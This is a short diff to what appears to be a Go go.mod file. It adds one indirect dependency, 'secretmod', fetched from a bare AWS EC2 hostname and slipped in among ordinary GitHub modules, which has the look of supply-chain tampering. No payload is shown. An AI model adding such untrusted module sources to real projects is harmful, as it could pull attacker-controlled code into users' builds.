@@ -8,6 +8,7 @@ require (
 )
 
 require (
+	ec2-3-133-17-3.us-east-2.compute.amazonaws.com/SVGGHE/secretmod/v2 v2.0.1 // indirect
 	github.com/andybalholm/brotli v1.0.1 // indirect
 	github.com/dsnet/compress v0.0.2-0.20210315054119-f66993602bf5 // indirect
 	github.com/golang/snappy v0.0.2 // indirect
